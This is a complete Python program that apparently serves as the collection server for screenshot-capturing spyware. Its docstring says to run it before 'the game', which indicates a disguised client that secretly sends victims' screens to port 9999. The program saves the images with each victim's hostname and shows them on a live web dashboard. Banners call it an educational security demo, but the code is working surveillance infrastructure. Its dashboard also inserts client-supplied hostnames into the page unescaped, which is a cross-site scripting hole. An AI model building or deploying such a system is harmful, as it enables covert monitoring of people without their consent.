"""
Complete Screenshot Monitoring System with Web Interface
Run this first, then run the game to capture screenshots
"""
import socket
import threading
import time
import json
import os
import base64
import zlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

# ==================== SOCKET SERVER ====================

class ScreenshotServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.screenshots = []
        self.save_dir = "captured_screenshots"
        os.makedirs(self.save_dir, exist_ok=True)

    def save_screenshot(self, data):
        """Save screenshot to disk and memory"""
        try:
            # Extract data
            screenshot_data = data.get('data', '')
            hostname = data.get('hostname', 'Unknown Host')
            screenshot_count = data.get('count', 0)
            timestamp = data.get('timestamp', time.time())

            # Decode base64
            decoded = base64.b64decode(screenshot_data)

            # Decompress if needed
            try:
                decompressed = zlib.decompress(decoded)
                image_data = decompressed
            except:
                image_data = decoded

            # Create filename
            timestamp_str = datetime.fromtimestamp(timestamp).strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(self.save_dir, f"screenshot_{hostname}_{timestamp_str}.png")

            # Save to file
            with open(filename, 'wb') as f:
                f.write(image_data)

            # Store in memory with base64 for web display
            screenshot_info = {
                'filename': filename,
                'timestamp': timestamp,
                'time_str': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S'),
                'size': len(image_data),
                'hostname': hostname,
                'count': screenshot_count,
                'image_data': f"data:image/png;base64,{base64.b64encode(image_data).decode('utf-8')}"
            }

            # Add to list (keep last 20)
            self.screenshots.append(screenshot_info)
            if len(self.screenshots) > 20:
                old_screenshot = self.screenshots.pop(0)
                try:
                    if os.path.exists(old_screenshot['filename']):
                        os.remove(old_screenshot['filename'])
                except:
                    pass

            print(f"[SERVER] Screenshot #{screenshot_count} saved from {hostname} ({len(image_data)} bytes)")
            return screenshot_info

        except Exception as e:
            print(f"[SERVER] Error saving screenshot: {e}")
            import traceback
            traceback.print_exc()
            return None

    def handle_client(self, client_socket, address):
        """Handle a single client connection"""
        print(f"[SERVER] Connection from {address}")

        try:
            # Receive all data
            data = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                data += chunk

                # Check for end marker
                if b"<END>" in data:
                    # Remove end marker
                    data = data.split(b"<END>")[0]
                    break

            if data:
                try:
                    # Parse JSON
                    screenshot_data = json.loads(data.decode('utf-8', errors='ignore'))

                    # Save screenshot
                    result = self.save_screenshot(screenshot_data)

                    if result:
                        client_socket.send(b"OK")
                    else:
                        client_socket.send(b"ERROR")

                except json.JSONDecodeError as e:
                    print(f"[SERVER] Invalid JSON: {e}")
                    client_socket.send(b"INVALID")
                except Exception as e:
                    print(f"[SERVER] Processing error: {e}")
                    client_socket.send(b"ERROR")

        except Exception as e:
            print(f"[SERVER] Connection error: {e}")

        finally:
            client_socket.close()
            print(f"[SERVER] Connection closed: {address}")

    def get_latest_screenshot(self):
        """Get the most recent screenshot"""
        if self.screenshots:
            return self.screenshots[-1]
        return {
            'filename': '',
            'timestamp': time.time(),
            'time_str': 'No screenshots yet',
            'size': 0,
            'hostname': 'Waiting...',
            'count': 0,
            'image_data': None
        }

    def get_all_screenshots(self):
        """Get all screenshots"""
        return self.screenshots

    def clear_screenshots(self):
        """Clear all screenshots"""
        try:
            for screenshot in self.screenshots:
                try:
                    if os.path.exists(screenshot['filename']):
                        os.remove(screenshot['filename'])
                except:
                    pass

            self.screenshots = []

            # Clear directory
            for file in os.listdir(self.save_dir):
                if file.endswith('.png'):
                    try:
                        os.remove(os.path.join(self.save_dir, file))
                    except:
                        pass

            print("[SERVER] All screenshots cleared")
            return True

        except Exception as e:
            print(f"[SERVER] Error clearing: {e}")
            return False

    def start(self):
        """Start the socket server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            print(f"[SERVER] Binding to {self.host}:{self.port}...")
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[SERVER] Listening on port {self.port}")
            print(f"[SERVER] Screenshots will be saved to: {os.path.abspath(self.save_dir)}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()

                except KeyboardInterrupt:
                    print("\n[SERVER] Shutdown requested...")
                    break
                except Exception as e:
                    print(f"[SERVER] Accept error: {e}")
                    time.sleep(1)

        except Exception as e:
            print(f"[SERVER] Startup error: {e}")
            import traceback
            traceback.print_exc()

        finally:
            if self.server_socket:
                self.server_socket.close()
            print("[SERVER] Server stopped")

    def stop(self):
        """Stop the server"""
        self.running = False

# ==================== WEB SERVER ====================

class ScreenshotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            # Serve main HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            html = self.get_html_template()
            self.wfile.write(html.encode())

        elif self.path == '/api/latest':
            # API endpoint for latest screenshot
            latest = server.get_latest_screenshot()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            self.wfile.write(json.dumps(latest).encode())

        elif self.path == '/api/all':
            # API endpoint for all screenshots
            all_shots = server.get_all_screenshots()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            self.wfile.write(json.dumps(all_shots).encode())

        elif self.path == '/api/status':
            # API endpoint for server status
            status = {
                'running': True,
                'screenshot_count': len(server.screenshots),
                'latest_timestamp': server.screenshots[-1]['timestamp'] if server.screenshots else None
            }

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

            self.wfile.write(json.dumps(status).encode())

        elif self.path.startswith('/screenshots/'):
            # Serve screenshot files directly
            filename = self.path.split('/')[-1]
            filepath = os.path.join('captured_screenshots', filename)

            if os.path.exists(filepath):
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()

                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()

        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'404 - Page not found')

    def do_POST(self):
        if self.path == '/api/clear':
            # Clear all screenshots
            success = server.clear_screenshots()

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            response = {'success': success, 'message': 'All screenshots cleared'}
            self.wfile.write(json.dumps(response).encode())

        else:
            self.send_response(404)
            self.end_headers()

    def get_html_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Screenshot Monitor - Real-time Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1a2980, #26d0ce);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            padding: 30px 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 20px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        
        .warning {
            background: rgba(255, 0, 0, 0.2);
            border: 2px solid #ff4444;
            padding: 15px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 800px;
            text-align: center;
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }
        
        @media (max-width: 1000px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .screenshot-box {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
        }
        
        .info-box {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
        }
        
        .box-title {
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #4df0ff;
            border-bottom: 2px solid #4df0ff;
            padding-bottom: 10px;
        }
        
        .screenshot-container {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 10px;
            padding: 20px;
            min-height: 500px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .screenshot-placeholder {
            text-align: center;
            color: #aaa;
            font-size: 1.2em;
        }
        
        #screenshotImage {
            max-width: 100%;
            max-height: 500px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .info-item {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 15px;
        }
        
        .info-label {
            font-size: 0.9em;
            color: #4df0ff;
            margin-bottom: 5px;
        }
        
        .info-value {
            font-size: 1.2em;
            font-weight: bold;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-top: 25px;
        }
        
        button {
            flex: 1;
            padding: 15px;
            border: none;
            border-radius: 10px;
            background: linear-gradient(to right, #4df0ff, #0099ff);
            color: white;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .clear-btn {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
        }
        
        .status-bar {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 20px;
            margin-top: 30px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        
        #statusText {
            font-size: 1.2em;
            margin-bottom: 10px;
        }
        
        #countdown {
            font-size: 1.5em;
            font-weight: bold;
            color: #4df0ff;
        }
        
        .history {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            padding: 25px;
            margin-top: 30px;
            backdrop-filter: blur(10px);
        }
        
        .history-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .history-item {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .history-item:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-5px);
        }
        
        .history-thumb {
            width: 100%;
            height: 100px;
            object-fit: cover;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9em;
        }
        
        .no-data {
            color: #aaa;
            font-style: italic;
            text-align: center;
            padding: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🕵️ Screenshot Monitoring Dashboard</h1>
            <p>Security Education Demonstration - FOR EDUCATIONAL PURPOSES ONLY</p>
            <div class="warning">
                ⚠️ <strong>WARNING:</strong> This is a security demonstration for educational purposes only. 
                Do not use this code for unauthorized surveillance.
            </div>
        </div>
        
        <div class="status-bar">
            <div id="statusText">🔄 Waiting for first screenshot...</div>
            <div>Next auto-refresh in: <span id="countdown">30</span> seconds</div>
        </div>
        
        <div class="dashboard">
            <div class="screenshot-box">
                <div class="box-title">📸 Latest Screenshot</div>
                <div class="screenshot-container">
                    <div id="screenshotContent" class="screenshot-placeholder">
                        No screenshot received yet
                    </div>
                </div>
                <div class="timestamp" id="timestamp" style="text-align: center; margin-top: 15px; color: #aaa;">
                    Waiting for data...
                </div>
            </div>
            
            <div class="info-box">
                <div class="box-title">📊 Connection Info</div>
                <div class="info-item">
                    <div class="info-label">🖥️ Source Host</div>
                    <div class="info-value" id="hostname">Unknown</div>
                </div>
                <div class="info-item">
                    <div class="info-label">📏 Image Size</div>
                    <div class="info-value" id="imageSize">0 KB</div>
                </div>
                <div class="info-item">
                    <div class="info-label">📊 Total Captured</div>
                    <div class="info-value" id="totalCaptured">0 images</div>
                </div>
                <div class="info-item">
                    <div class="info-label">🕒 Last Updated</div>
                    <div class="info-value" id="lastUpdated">Never</div>
                </div>
                
                <div class="controls">
                    <button onclick="refreshScreenshot()">🔄 Refresh Now</button>
                    <button onclick="clearHistory()" class="clear-btn">🗑️ Clear All</button>
                </div>
            </div>
        </div>
        
        <div class="history">
            <div class="box-title">📚 Screenshot History</div>
            <div class="history-grid" id="historyGrid">
                <div class="no-data">No screenshots captured yet</div>
            </div>
        </div>
        
        <div class="footer">
            <p>Security Education Project | This dashboard displays screenshots captured from connected clients</p>
            <p>Server running on port 9999 | Web interface on port 8000</p>
        </div>
    </div>
    
    <script>
        let refreshCountdown = 30;
        let countdownInterval;
        
        function updateCountdown() {
            refreshCountdown--;
            document.getElementById('countdown').textContent = refreshCountdown;
            
            if (refreshCountdown <= 0) {
                refreshCountdown = 30;
                fetchLatestScreenshot();
            }
        }
        
        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        function formatTime(timestamp) {
            if (!timestamp) return 'N/A';
            const date = new Date(timestamp * 1000);
            return date.toLocaleTimeString() + ' ' + date.toLocaleDateString();
        }
        
        async function fetchLatestScreenshot() {
            try {
                const response = await fetch('/api/latest');
                const data = await response.json();
                
                if (data.image_data) {
                    // Update screenshot
                    document.getElementById('screenshotContent').innerHTML = 
                        `<img src="${data.image_data}" alt="Captured Screenshot" id="screenshotImage">`;
                    
                    // Update info
                    document.getElementById('hostname').textContent = data.hostname || 'Unknown';
                    document.getElementById('imageSize').textContent = formatBytes(data.size || 0);
                    document.getElementById('timestamp').textContent = 
                        `Captured: ${data.time_str || formatTime(data.timestamp)}`;
                    document.getElementById('lastUpdated').textContent = new Date().toLocaleTimeString();
                    
                    // Update status
                    const statusEl = document.getElementById('statusText');
                    statusEl.textContent = `✅ Screenshot #${data.count} received from ${data.hostname}`;
                    statusEl.style.color = '#4df0ff';
                }
                
                // Update total count and history
                const allResponse = await fetch('/api/all');
                const allData = await allResponse.json();
                document.getElementById('totalCaptured').textContent = 
                    `${allData.length} image${allData.length !== 1 ? 's' : ''}`;
                
                updateHistoryGrid(allData);
                
            } catch (error) {
                console.error('Error fetching screenshot:', error);
                document.getElementById('statusText').textContent = 
                    '❌ Error connecting to server';
                document.getElementById('statusText').style.color = '#ff4444';
            }
        }
        
        function updateHistoryGrid(screenshots) {
            const historyGrid = document.getElementById('historyGrid');
            
            if (screenshots.length === 0) {
                historyGrid.innerHTML = '<div class="no-data">No screenshots captured yet</div>';
                return;
            }
            
            let html = '';
            // Show latest 8 screenshots
            const recentScreenshots = screenshots.slice(-8).reverse();
            
            recentScreenshots.forEach(screenshot => {
                if (screenshot.image_data) {
                    html += `
                        <div class="history-item" onclick="showScreenshot('${screenshot.image_data}', '${screenshot.hostname}', '${screenshot.time_str}')">
                            <img src="${screenshot.image_data}" alt="Thumbnail" class="history-thumb">
                            <div>${screenshot.hostname}</div>
                            <div style="font-size: 0.8em; color: #aaa;">${screenshot.time_str.split(' ')[1]}</div>
                        </div>
                    `;
                }
            });
            
            historyGrid.innerHTML = html;
        }
        
        function showScreenshot(imageData, hostname, timestamp) {
            document.getElementById('screenshotContent').innerHTML = 
                `<img src="${imageData}" alt="Captured Screenshot" id="screenshotImage">`;
            document.getElementById('hostname').textContent = hostname;
            document.getElementById('timestamp').textContent = `Captured: ${timestamp}`;
        }
        
        function refreshScreenshot() {
            refreshCountdown = 30;
            document.getElementById('countdown').textContent = refreshCountdown;
            fetchLatestScreenshot();
        }
        
        function clearHistory() {
            if (confirm('Clear all captured screenshots? This cannot be undone.')) {
                fetch('/api/clear', { method: 'POST' })
                    .then(() => {
                        alert('All screenshots cleared');
                        refreshScreenshot();
                    })
                    .catch(error => {
                        console.error('Error clearing:', error);
                        alert('Error clearing screenshots');
                    });
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            fetchLatestScreenshot();
            countdownInterval = setInterval(updateCountdown, 1000);
        });
    </script>
</body>
</html>"""

    def log_message(self, format, *args):
        # Suppress default log messages
        pass

# ==================== MAIN EXECUTION ====================

def run_web_server():
    """Run the web interface on port 8000"""
    try:
        web_server = HTTPServer(('localhost', 8000), ScreenshotHandler)
        print(f"[WEB] Screenshot viewer running on http://localhost:8000")
        print(f"[WEB] Press Ctrl+C to stop")
        web_server.serve_forever()
    except Exception as e:
        print(f"[WEB] Error: {e}")
        import traceback
        traceback.print_exc()

def run_socket_server():
    """Run the socket server on port 9999"""
    try:
        print(f"[SOCKET] Starting server on port 9999...")
        server.start()
    except Exception as e:
        print(f"[SOCKET] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    print("=" * 60)
    print("SCREENSHOT MONITORING SYSTEM - SECURITY DEMO")
    print("=" * 60)
    print("FOR EDUCATIONAL PURPOSES ONLY")
    print("\nStarting servers...")
    print("1. Socket server on port 9999 (receives screenshots)")
    print("2. Web interface on http://localhost:8000 (displays screenshots)")
    print("=" * 60)

    # Create server instance
    server = ScreenshotServer(host='0.0.0.0', port=9999)

    # Start socket server in background thread
    socket_thread = threading.Thread(target=run_socket_server, daemon=True)
    socket_thread.start()

    # Give socket server time to start
    time.sleep(2)

    # Start web server (main thread)
    run_web_server()
